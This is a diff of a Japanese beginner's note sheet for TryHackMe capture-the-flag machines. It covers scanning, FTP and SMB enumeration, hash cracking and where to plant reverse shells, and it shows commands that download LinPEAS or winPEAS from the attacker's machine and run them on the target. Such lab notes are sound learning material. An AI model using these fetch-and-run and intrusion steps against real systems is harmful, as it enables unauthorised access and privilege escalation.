@@ -1,7 +1,7 @@
 # TryHackMeマシン攻略メモ
 
 ## 趣旨
-脆弱性そのものを見つけたりexploitを作ることよりも、マシン攻略のヒントを得るためのメモ。ほぼLinuxマシンを対象に書いている。
+脆弱性そのものを見つけたりexploitを作ることよりも、マシン攻略のヒントを得ることに焦点を当てたメモ。ほぼLinuxマシンを対象に書いている。
 
 ## 書いた人
 [cashitsuki](https://tryhackme.com/p/cashitsuki)。セキュリティとTryHackMeの初心者。基本Esayばかり解いている。
@@ -19,7 +19,6 @@
 ヒントは見つけた順番で書くと自分は混乱しやすかった。そのため、ポート番号やディレクトリごとに分類して整理している。
 
 ## nmap
-
 テンプレはこれ。
 
 ```
@@ -36,7 +35,7 @@ sudo nmap -vv -sV -sC -T4 -oN nmap/log $MACHINE_IP
 writeupを見ていると[RustScan](https://github.com/RustScan/RustScan)でポートスキャンしてるものもたまに見かける。
 
 ## gobuster
-最初は何の言語で動いているかわからないので`-x`は省いてることが多い。
+最初は何の言語で動いているかわからないので`-x`は省くことが多い。
 
 ```
 gobuster dir -u http://$MACHINE_IP -w /path/to/wordlist -o gobuster/log -x .php,.js
@@ -74,7 +73,7 @@ ftp $MACHINE_IP
 
 nmapで`-sC`オプションを指定しておけばポートスキャン時にanonymousログインが許されるかのどうかが判定できる。許可されていればユーザー名は`anonymous`、パスワードは空欄でログインできる。
 
-ftpでよく使うコマンドは以下。
+ftpでよく使うコマンド。
 - `help`  ... ヘルプの表示
 - `get`   ... ファイルのダウンロード
 - `put`   ... ファイルのアップロード
@@ -91,7 +90,7 @@ wget -r ftp://user:pass@$MACHINE_IP/
 
 
 ## SMB
-以下使ったことがある。SMBの問題を解いた数が少なすぎるので自分の中でテンプレができていない。
+以下使ったことがあるもの。SMBの問題を解いた数が少なすぎるので自分の中でテンプレができていない。
 - `enum4linux`
 - [A Little Guide to SMB Enumeration](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)
 - [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#list-shared-folders)
@@ -127,7 +126,6 @@ wget -r ftp://user:pass@$MACHINE_IP/
 - `objdump`を使った静的解析、`gdb`を使った動的解析をする
 
 ### ハッシュ
-
 `hash-identifier`をコンソール上で叩いてハッシュの種類を特定した後、`hashacat`で総当りする。
 
 ```
@@ -139,7 +137,7 @@ hashcat -a 0 -m 70 ./pass.hash /path/to/wordlsit
 - `-a` ... 攻撃モード
 - `-m` ... ハッシュの種類
 
-以下のサイトを使ってハッシュ元を得ることも多い。
+Webページを使ってハッシュ元を得ることも多い。
 - [CrackStation](https://crackstation.net/)
 - [MD5Hashing.net](https://md5hashing.net)
 - [hashes.com](https://hashes.com/en/decrypt/hash)
@@ -228,7 +226,7 @@ HTTPやHTPPSでリクエストを送るとき、最後の部分は`IP以外のUR
 - 基本事項は[TryHackMeのこのroom](https://tryhackme.com/room/introtoshells)で学べる
 - リバースシェル本体を手に入れるときは[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)を使う
 
-リバースシェルを仕掛ける場所は問題を解いて勘を養うしかないと思っている。よくあるのは以下。
+リバースシェルを仕掛ける場所は問題を解いて勘を養うしかないと思っている。
 - FTPでファイルをアップロード後、`assets`や`upload`といったディレクトリにアクセスして呼び出す
     - FTP側で`chmod`使って実行できるようにしておく
 - OSコマンドインジェクションで仕掛ける。
@@ -239,7 +237,6 @@ HTTPやHTPPSでリクエストを送るとき、最後の部分は`IP以外のUR
 
 
 ## 攻略対象のマシンに入ったら
-最初にやることは以下。
 - `whoami` ... ユーザー名を確認する
 - `id` ... ユーザーのグループを確認する
     - 自分以外のグループに所属しているかを確認することが重要
@@ -278,7 +275,7 @@ scp ./exploit user@$MACHINE_IP:/home/user/
 
 
 ### LinPEASとwinPEAS
-攻略対象のマシンに入って何をすべきかわからないうちは[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)や[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)を使うのがいい。
+攻略対象のマシンに入って何をすべきかわからないうちは[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)や[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)を使うのがいい。自分がいるディレクトリで書き込みが許されていないというパターンがあるので、あらかじめ`/tmp`に移動してからダウンロードする。
 
 ```
 # ローカルマシン上
@@ -292,9 +289,8 @@ cd /tmp
 wget http://$LOCAL_IP:3000/linpeas.sh
 ./linpes.sh | tee linpeas.log
 ```
-自分がいるディレクトリで書き込みが許されていないというパターンがあるので`/tmp`に移動しておく。
 
-Windowsなら以下のようにする。
+Windowsの場合。
 
 ```
 # ローカルマシン上
@@ -308,7 +304,6 @@ cd C:\Windows\Temp
 Invoke-WebRequest -Uri http://$LOCAL_IP:3000/winPEASx64.exe -OutFile winPEASx64.exe
 .\winPEASx64.exe
 ```
-
 
 ### ポートフォワード
 `netstat -lvnp`でサーバーが待ち受けているポート番号一覧が取得できる。結果を見ると、たまにポートスキャナで検知できなかったものがある。このとき普通にローカルマシンからアクセスしようとしても弾かれてしまうのでポートフォワーディングを実行してアクセスできるようにする。
